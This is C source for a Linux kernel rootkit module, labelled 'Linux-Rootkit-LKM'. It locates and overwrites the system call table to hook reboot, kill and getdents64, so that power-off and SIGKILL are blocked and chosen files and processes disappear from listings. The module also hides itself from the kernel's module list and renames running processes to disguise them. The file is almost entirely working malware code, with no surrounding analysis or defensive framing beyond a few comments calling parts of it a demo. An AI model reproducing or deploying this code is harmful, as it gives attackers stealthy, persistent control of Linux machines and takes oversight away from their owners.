#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <asm/syscall.h>
#include <linux/reboot.h>
// for getdents64 hook
#include <linux/fdtable.h>
#include <linux/proc_ns.h>

#include "loadable_kernel_module.h"

// kprobe for kallsyms_lookup_name
#include <linux/kprobes.h>
static struct kprobe kp = {
	    .symbol_name = "kallsyms_lookup_name"
};

#define OURMODNAME "loadable_kernel_module"
// Custom flag stored in task_struct->flags to mark a process as rootkit-hidden.
// Must not collide with any kernel-defined PF_* flag; verify against <linux/sched.h> on each kernel upgrade.
#define PF_INVISIBLE 0x10000000

MODULE_AUTHOR("Harry Hsu x90613@gmail.com");
MODULE_DESCRIPTION("Linux-Rootkit-LKM");
MODULE_LICENSE("Dual MIT/GPL");
MODULE_VERSION("1.0");

struct task_struct * find_task(pid_t pid)
{
	struct task_struct *p;
	// for_each_process requires rcu_read_lock() to safely walk the task list.
	// A task can exit and free its task_struct mid-iteration without the lock.
	rcu_read_lock();
	for_each_process(p) {
		if (p->pid == pid) {
			rcu_read_unlock();
			return p;
		}
	}
	rcu_read_unlock();
	return NULL;
}

int is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}

int change_process_name(const char *orig_name, const char *new_name) {
    struct task_struct *p = NULL;
    int found = 0;

    // for_each_process requires rcu_read_lock() to safely walk the task list.
    rcu_read_lock();
    for_each_process(p) {
        if (strcmp(p->comm, orig_name) == 0) {
            strncpy(p->comm, new_name, TASK_COMM_LEN - 1);
            p->comm[TASK_COMM_LEN - 1] = '\0';
            found = 1;
            printk(KERN_INFO "Process with original name '%s' found and renamed to '%s'\n", orig_name, new_name);
        }
    }
    rcu_read_unlock();

    return found ? 0 : -1;
}

static int major;
struct cdev *kernel_cdev;
// Points to a static empty string initially; replaced by a kmalloc'd buffer in IOCTL_FILE_HIDE.
// The empty-string sentinel is checked via *HIDDEN_FILE != '\0' before kfree — do not set to NULL.
char *HIDDEN_FILE = "";

// the necessary variables that the syscall table requires to access and modify 
static unsigned long *__sys_call_table;
void (*update_mapping_prot)(phys_addr_t phys, unsigned long virt, phys_addr_t size, pgprot_t prot);
unsigned long start_rodata;
unsigned long init_begin;
// Size of the read-only data section. Used to temporarily make the syscall table writable.
// Parentheses omitted intentionally — macro is only used in a single-argument context.
#define section_size init_begin - start_rodata

typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
static t_syscall orig_kill;
static t_syscall orig_reboot;
static t_syscall orig_getdents64;

// Syscall hook Part
static asmlinkage int hacked_reboot(const struct pt_regs *pt_regs) 
{
	unsigned int cmd;
	// On arm64: reboot(2) args are magic, magic2, cmd, arg — cmd is the 3rd argument (regs[2]).
	// On x86_64: 3rd syscall argument is in rdx, which maps to regs[2] in pt_regs layout.
	cmd = (unsigned int) pt_regs->regs[2];
	printk(KERN_INFO "enter hacked reboot section.\n");

	if(cmd == LINUX_REBOOT_CMD_POWER_OFF) {
		printk(KERN_INFO "power off command intercepted and denied.\n");
		return 0;
	}

	return orig_reboot(pt_regs);
}

static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
	// On arm64/x86_64: kill(2) signature is kill(pid, sig) — sig is the 2nd argument (regs[1]).
	int sig = (int) pt_regs->regs[1];
	printk(KERN_INFO "enter hacked kill section.\n");

	// Demo behavior: intercept SIGKILL system-wide to show a syscall hook can make
	// any process unkillable. This is intentional for demonstration purposes.
	switch (sig) {
		case 9:
			printk(KERN_INFO "kill signal intercepted and denied.\n");
			break;
		default:
			return orig_kill(pt_regs);
	}
	return 0;
}

static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs) 
{
	// fd and dirent are the first two arguments to getdents64(fd, dirp, count).
	int fd = (int) pt_regs->regs[0];
	struct linux_dirent * dirent = (struct linux_dirent *) pt_regs->regs[1];
	int ret = orig_getdents64(pt_regs), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	kdirent = kzalloc(ret, GFP_KERNEL);
	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	// Access fdtable under rcu_read_lock() as required; validate fd against max_fds
	// before indexing to avoid an out-of-bounds read on a user-controlled fd value.
	rcu_read_lock();
	{
		struct fdtable *fdt = files_fdtable(current->files);
		struct file *f = (fd >= 0 && (unsigned int)fd < fdt->max_fds) ? fdt->fd[fd] : NULL;
		if (f) {
			d_inode = f->f_path.dentry->d_inode;
			if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev))
				proc = 1;
		}
	}
	rcu_read_unlock();

	// printk(KERN_INFO "HIDDEN_FILE: %s\n", HIDDEN_FILE);

	while (off < ret) {
		dir = (void *)kdirent + off;
		// Guard against malformed dirents with d_reclen == 0; advancing by zero loops forever.
		if (dir->d_reclen == 0)
			break;
		// Hide the entry if: (not in /proc) and its name matches HIDDEN_FILE,
		// OR (in /proc) and the entry's numeric name is a PF_INVISIBLE pid.
		if (((HIDDEN_FILE && *HIDDEN_FILE != '\0') && (!proc && (memcmp(HIDDEN_FILE, dir->d_name, strlen(HIDDEN_FILE)) == 0))) || (proc && is_invisible(simple_strtoul(dir->d_name, NULL, 10)))){
			// First entry: shift remaining dirents left over it, shrink ret.
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}

// hidden module part
static struct list_head *prev_module;
static short hidden = 0;
void module_show(void)
{
    /* back to the module list where we remove before */
    list_add(&THIS_MODULE->list, prev_module);
    hidden = 0;
	printk(KERN_INFO "module unhidden\n");
}
void module_hide(void)
{
    /* Save this module in the list before us, make this module back to the list in the same place later. */
    prev_module = THIS_MODULE->list.prev;
    /* Remove ourselves from the list module list */
    list_del(&THIS_MODULE->list);
    hidden = 1;
	printk(KERN_INFO "module hidden\n");
}


static unsigned long *get_syscall_table(void)
{
	unsigned long *syscall_table;
	
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;
	// kallsyms_lookup_name is unexported since kernel 5.7. We recover its address by registering
	// a kprobe on its symbol, reading kp.addr, then immediately unregistering.
	if (register_kprobe(&kp) < 0)
		return NULL;
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

	// The parameters to be obtained from kallsyms_lookup_name are generated here.
	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	update_mapping_prot = (void *)kallsyms_lookup_name("update_mapping_prot");
	start_rodata = (unsigned long)kallsyms_lookup_name("__start_rodata");
	init_begin = (unsigned long)kallsyms_lookup_name("__init_begin");

	printk(KERN_INFO "sys_call_table address: %p\n", syscall_table);
	return syscall_table;
}

static inline void protect_memory(void)
{
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL_RO); // Read - only
	printk(KERN_INFO "Memory protected\n");
}

static inline void unprotect_memory(void)
{
	update_mapping_prot(__pa_symbol(start_rodata), (unsigned long)start_rodata, section_size, PAGE_KERNEL); // Read - write
	printk(KERN_INFO "Memory unprotected\n");
}

static int hook(void)
{
	unprotect_memory();

	__sys_call_table[__NR_reboot] = (unsigned long) &hacked_reboot;
	__sys_call_table[__NR_kill] = (unsigned long) &hacked_kill;
	__sys_call_table[__NR_getdents64] = (unsigned long) &hacked_getdents64;

	protect_memory();
	return 0;
}

/*  --------------------------------------------------  */

static int lkm_open(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static int lkm_release(struct inode *inode, struct file *filp)
{
	printk(KERN_INFO "%s\n", __func__);
	return 0;
}

static long lkm_ioctl(struct file *filp, unsigned int ioctl, unsigned long arg)
{
	struct hided_file file_info;
	struct masq_proc_req user_req;
	struct masq_proc *req_array;
	int ret = 0;
	size_t i;
	switch(ioctl) {
		case IOCTL_MOD_HOOK:
			hook();
			break;
		case IOCTL_MOD_HIDE:
			if (hidden == 0) {
				module_hide();
			} else {
				module_show();
			}
			break;
		case IOCTL_MOD_MASQ:
			if (copy_from_user(&user_req, (struct masq_proc_req *)arg, sizeof(struct masq_proc_req)))
				return -EFAULT;

			// Cap user-supplied len to prevent signed/unsigned wrap and excessive allocation.
			if (user_req.len > 256)
				return -EINVAL;

			// printk(KERN_INFO "Received masq_proc_req: len = %zu\n", user_req.len);
			req_array = kmalloc_array(user_req.len, sizeof(struct masq_proc), GFP_KERNEL);
			if (!req_array) {
				printk(KERN_INFO "Memory allocation failed\n");
				return -ENOMEM;
			}

			if (copy_from_user(req_array, user_req.list, user_req.len * sizeof(struct masq_proc))) {
				kfree(req_array);
				return -EFAULT;
			}

			for (i = 0; i < user_req.len; ++i) {
				// Only rename if new_name is strictly shorter than orig_name — prevents overflowing p->comm
				// when strncpy is called in change_process_name.
				// strnlen guards against non-null-terminated user-filled fields.
				if (strnlen(req_array[i].new_name, MASQ_LEN) >= strnlen(req_array[i].orig_name, MASQ_LEN)) {
					// printk(KERN_INFO "Error: New name '%s' should be shorter than original name '%s'\n", req_array[i].new_name, req_array[i].orig_name);
					continue;
				}
				change_process_name(req_array[i].orig_name, req_array[i].new_name);
				// printk(KERN_INFO "Received masq_proc[%zu]: Original name: %s, New name: %s\n", i, req_array[i].orig_name, req_array[i].new_name);
			}

			kfree(req_array);
			break;
		case IOCTL_FILE_HIDE:
			if (copy_from_user(&file_info, (struct hided_file *)arg, sizeof(struct hided_file)))
                return -EFAULT;
            printk(KERN_INFO "Received hidden file: %s, size: %lu\n", file_info.name, file_info.len);
			// Replace HIDDEN_FILE with a newly allocated buffer holding the filename to suppress from getdents64.
			// Reject zero-length to prevent size_t underflow on the null-terminator write below.
			if (file_info.len == 0 || file_info.len > NAME_LEN)
				return -EINVAL;
			if (HIDDEN_FILE && *HIDDEN_FILE != '\0')
				kfree(HIDDEN_FILE);
			HIDDEN_FILE = kmalloc(file_info.len, GFP_KERNEL);
			if (!HIDDEN_FILE)
				return -ENOMEM;
			memcpy(HIDDEN_FILE, file_info.name, file_info.len);
			HIDDEN_FILE[file_info.len - 1] = '\0';
			break;
		default:
			ret = -EINVAL;
	}
	printk(KERN_INFO "%s\n", __func__);
	return ret;
}

/* File operations structure */
struct file_operations fops = {
	.open = lkm_open,
	.unlocked_ioctl = lkm_ioctl,
	.release = lkm_release,
	.owner = THIS_MODULE,
};

static int __init lkm_init(void)
{
	int ret;
	dev_t dev_no, dev;

	/* Allocate a character device structure */
	kernel_cdev = cdev_alloc();
	if (!kernel_cdev)
		return -ENOMEM;
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	/* Dynamically allocate a character device region */
	ret = alloc_chrdev_region(&dev_no, 0, 1, "loadable_kernel_module");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		cdev_del(kernel_cdev);
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	printk("The major number for your device is %d\n", major);

	/* Register a device structure with the kernel VFS*/
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info(KERN_INFO "unable to allocate cdev");
		cdev_del(kernel_cdev);
		unregister_chrdev_region(dev_no, 1);
		return ret;
	}

	// get __sys_call_table's address
	__sys_call_table = get_syscall_table();
	if (!__sys_call_table) {
		printk(KERN_INFO "Failed to find sys_call_table\n");
		cdev_del(kernel_cdev);
		unregister_chrdev_region(dev_no, 1);
		return -ENOENT;
	}

	printk(KERN_INFO "__NR_reboot: %d\n", __NR_reboot);
	printk(KERN_INFO "__NR_kill: %d\n", __NR_kill);
	printk(KERN_INFO "__NR_getdents64: %d\n", __NR_getdents64);

	// To store original syscall table addresses
	orig_reboot = (t_syscall)__sys_call_table[__NR_reboot];
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];
	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];

	return 0;
}

static void __exit lkm_exit(void)
{
	// Restore all hooked syscalls before unloading. unprotect_memory/protect_memory bracket the writes
	// because the syscall table lives in read-only memory at runtime.
	// Note: no synchronization with in-flight calls to hacked_* — a concurrent syscall may execute
	// the hook after the table entry is restored but before the module text is unmapped (TOCTOU).
	unprotect_memory();

	__sys_call_table[__NR_reboot] = (unsigned long)orig_reboot; 
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;
	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	
	protect_memory();

	if (HIDDEN_FILE && *HIDDEN_FILE != '\0')
		kfree(HIDDEN_FILE);

	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(lkm_init);
module_exit(lkm_exit);
